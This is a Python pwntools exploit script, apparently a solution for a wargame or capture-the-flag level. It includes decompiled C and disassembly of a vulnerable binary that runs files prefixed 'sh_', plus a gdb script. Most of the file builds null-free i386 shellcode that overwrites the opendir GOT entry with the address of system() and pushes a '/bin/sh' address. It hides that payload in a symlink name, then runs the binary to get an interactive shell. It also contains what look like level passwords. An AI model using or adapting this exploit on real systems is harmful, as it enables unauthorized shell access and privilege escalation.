from lib.exploit import *



'''
int main(int argc,char **argv)

{
  DIR *user_chosen_dir;
  int is_shell;
  dirent *dir_ent;
  dirent *ds;
  DIR *dp;
  
  if (argv[1] == (char *)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  user_chosen_dir = opendir(argv[1]);
  if (user_chosen_dir == (DIR *)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  while( true ) {
    dir_ent = readdir(user_chosen_dir);
    if (dir_ent == (dirent *)0x0) break;
    is_shell = strncmp("sh_",dir_ent->d_name,3);
    if (is_shell == 0) {
      run(dir_ent->d_name + 3);
    }
  }
  return 0;
}
'''


gdb_script = '''
set disassembly-flavor intel   
alias gil = disassemble

def show_arg
x/20wx$ebp+0x8
end

# in break after stack setup
b *0x08048491
# break before call to opendir.plt
b *0x080484c7
# before call of run
b *0x080484fc
# ret of run
b* 0x080484a4
unset env
show env

r /tmp/gil/

'''


'''
run:

0x0804848b <+0>:     push   ebp
0x0804848c <+1>:     mov    ebp,esp
0x0804848e <+3>:     sub    esp,0x4
0x08048491 <+6>:     lea    eax,[ebp-0x4]
0x08048494 <+9>:     add    eax,0x8
0x08048497 <+12>:    mov    DWORD PTR [ebp-0x4],eax
0x0804849a <+15>:    mov    eax,DWORD PTR [ebp-0x4]
0x0804849d <+18>:    mov    edx,DWORD PTR [ebp+0x8]
0x080484a0 <+21>:    mov    DWORD PTR [eax],edx
0x080484a2 <+23>:    nop
0x080484a3 <+24>:    leave  
0x080484a4 <+25>:    ret    

'''

# s = connect_to_local("1", "aathaeyiew", remote=False)
s = connect("1", "aathaeyiew")
from lib.exploit import *


def write_to_adr(adr, val, packing=True):
    payload = b""
    # movs werden oft als push/pop combies implementiert von pwntools, nicht wundern
    # backup stackpointer
    payload += pwnlib.encoders.encoder.null(asm(pwnlib.shellcraft.i386.mov('edi', 'esp')))
    payload += pwnlib.encoders.encoder.null(asm(pwnlib.shellcraft.i386.mov('esp', adr)))
    # mov    DWORD PTR [esp],value
    if packing:
        payload += b"\xc7\x04\x24" + pack(val, 32)
    else:
        assert len(val) == 4
        payload += b"\xc7\x04\x24" + val
    # restore stackpointer
    payload += pwnlib.encoders.encoder.null(asm(pwnlib.shellcraft.i386.mov('esp', 'edi')))
    return payload


def jump_to_adr(adr):
    payload = b""
    payload += asm(pwnlib.shellcraft.i386.push(adr))
    payload += asm(pwnlib.shellcraft.i386.ret())
    # jmp eax
    # payload += pwnlib.encoders.encoder.null(asm(pwnlib.shellcraft.i386.mov('eax', adr)))
    # payload += b"\xff\xe0"
    return payload


bin_sh_adr = 0xf7f6ecc8
system_adr = 0xf7e4c850
eip_at_open_dir_call = 0x080484c7
open_dir_got = 0x80497f8


dir = b"/tmp/gil/"
log.info("%s " % s.process(["rm", "-rf", dir]).recvall())
log.info("%s " % s.process(["mkdir", "-p", dir]).recvall())
# clear dir
upload(s, gdb_script, dir+b"gdb.script")

payload = b""
payload += write_to_adr(open_dir_got, system_adr)
payload += asm(pwnlib.shellcraft.i386.push(bin_sh_adr))
payload += jump_to_adr(eip_at_open_dir_call)


log.info(f"payload: {payload}")


# payload += asm(pwnlib.shellcraft.i386.push(bin_sh_adr))
# # # call
# payload += b"\x9acp"+pack(system_adr, 32)

link = b"sh_" + payload
# should be link so i can include raw bytes after sh_ but does not need to point to anything useful
log.info("%s " % s.process(["touch", "linkto"], cwd=dir).recvall())
log.info("%s " % s.process(['ln', '-s', dir+b'linkto', link], cwd=dir).recvall())

io = s.process(["env", "-i", BINARY_PATH, dir])
io.interactive()

# ceewaceiph